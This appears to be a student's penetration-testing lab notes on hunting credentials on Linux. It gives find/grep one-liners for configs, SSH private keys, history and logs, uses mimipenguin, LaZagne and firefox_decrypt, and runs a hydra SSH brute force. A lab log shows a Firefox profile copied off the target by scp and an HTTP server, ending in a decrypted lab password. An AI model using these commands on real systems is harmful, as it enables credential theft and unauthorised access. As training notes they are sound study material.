# Credential Hunting in Linux

There are several sources that can provide us with credentials :

## Files
-> In Linux everything is a file

**List all Configuration Files**

for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done

**Credentials in Configuration Files**

for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done

**Databases**

for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done

**Notes**

find /home/* -type f -name "*.txt" -o ! -name "*.*"

**Scripts**

for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done

**Cronjobs**

cat /etc/crontab

(/etc/cron.d/ for debian distributions)

ls -la /etc/cron.*/

**SSH Private Keys**

grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"

**SSH Public Keys**

grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"

## History

-> Command-line History

**Bash History**

tail -n5 /home/*/.bash*
cat ~/.bash_history


**Logs**

for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done

## Memory and Cache

**Memory - Mimipenguin**

sudo python3 mimipenguin.py
sudo bash mimipenguin.sh
sudo python2.7 laZagne.py all

Cache
In-memory Processing

## Key-Rings

**Firefox Stored Credentials**

ls -l .mozilla/firefox/ | grep default

cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .

python3.9 firefox_decrypt.py

Select the Mozilla profile you wish to decrypt
1 -> lfx3lvhb.default
2 -> 1bplpd86.default-release

**Browsers - LaZagne**

python3 laZagne.py browsers

# LAB

vi password.list
LoveYou1
cat custom.rule
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
hydra -l kira -P mut_password.list ssh://$TARGET

[22][ssh] host: 10.129.16.140   login: kira   password: L0vey0u1!

ssh kira@$TARGET

for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass\|will" $i 2>/dev/null | grep -v "\#";done

sudo python2.7 laZagne.py all

tail -n5 /home/*/.bash*






==> /home/kira/.bash_history <==
rm *
ssh-keygen -t rsa -m PEM
cat id_rsa.pub > authorized_keys
vim authorized_keys 
su

==> /home/kira/.bash_logout <==
\# when leaving the console clear the screen to increase privacy

if [ "$SHLVL" = 1 ]; then
    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q
fi

==> /home/kira/.bashrc <==
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi
tail: cannot open '/home/sam/.bash_history' for reading: Permission denied

==> /home/sam/.bash_logout <==
\# when leaving the console clear the screen to increase privacy

if [ "$SHLVL" = 1 ]; then
    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q
fi

==> /home/sam/.bashrc <==
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi
tail: cannot open '/home/will/.bash_history' for reading: Permission denied

==> /home/will/.bash_logout <==
\# when leaving the console clear the screen to increase privacy

if [ "$SHLVL" = 1 ]; then
    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q
fi

==> /home/will/.bashrc <==
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi




tail /home/*/.bash*







vim logins.json 
su
cd
cd .ssh/
ls
rm *
ssh-keygen -t rsa -m PEM
cat id_rsa.pub > authorized_keys
vim authorized_keys 
su

==> /home/kira/.bash_logout <==
\# ~/.bash_logout: executed by bash(1) when login shell exits.

\# when leaving the console clear the screen to increase privacy

if [ "$SHLVL" = 1 ]; then
    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q
fi

==> /home/kira/.bashrc <==
\# enable programmable completion features (you don't need to enable
\# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
\# sources /etc/bash.bashrc).
if ! shopt -oq posix; then
  if [ -f /usr/share/bash-completion/bash_completion ]; then
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi
tail: cannot open '/home/sam/.bash_history' for reading: Permission denied

==> /home/sam/.bash_logout <==
\# ~/.bash_logout: executed by bash(1) when login shell exits.

\# when leaving the console clear the screen to increase privacy

if [ "$SHLVL" = 1 ]; then
    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q
fi

==> /home/sam/.bashrc <==
\# enable programmable completion features (you don't need to enable
\# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
\# sources /etc/bash.bashrc).
if ! shopt -oq posix; then
  if [ -f /usr/share/bash-completion/bash_completion ]; then
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi
tail: cannot open '/home/will/.bash_history' for reading: Permission denied

==> /home/will/.bash_logout <==
\# ~/.bash_logout: executed by bash(1) when login shell exits.

\# when leaving the console clear the screen to increase privacy

if [ "$SHLVL" = 1 ]; then
    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q
fi

==> /home/will/.bashrc <==
\# enable programmable completion features (you don't need to enable
\# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
\# sources /etc/bash.bashrc).
if ! shopt -oq posix; then
  if [ -f /usr/share/bash-completion/bash_completion ]; then
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi



for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "logins" $i 2>/dev/null | grep -v "\#";done






cat ~/.bash_history

cd
git clone https://github.com/unode/firefox_decrypt.git
cd firefox_decrypt/
ls
./firefox_decrypt.py 
su
./firefox_decrypt.py 
python3.9 firefox_decrypt.py 
cd ..
rm -rf firefox_decrypt/
vim .bash_history 
su
firefox 
su
firefox 
cd .mozilla/firefox/
ls
cd ytb95ytb.default-release/
ls
cat logins.json 
vim logins.json 
jq
su
ls
vim logins.json 
su
cd
cd .ssh/
ls
rm *
ssh-keygen -t rsa -m PEM
cat id_rsa.pub > authorized_keys
vim authorized_keys 
su


find .-name profiles.ini 2> /dev/null

python3.9 firefox_decrypt.py --format json 

scp -r .mozilla/firefox/ytb95ytb.default-release plaintext@10.10.16.21:/home/

On target :
python3 -m http.server

On pwnbox :
wget -r $TARGET:8000/
mv /home/10.129.218.143:8000 /home/ytb95ytb.default-release

sudo python3.9 /workspace/firefox_decrypt/firefox_decrypt.py /home/ytb95ytb.default-release

2023-11-04 09:36:16,046 - WARNING - profile.ini not found in /home/ytb95ytb.default-release
2023-11-04 09:36:16,046 - WARNING - Continuing and assuming '/home/ytb95ytb.default-release' is a profile location
Website:   https://dev.inlanefreight.com
Username: 'will@inlanefreight.htb'
Password: 'TUqr7QfLTLhruhVbCP'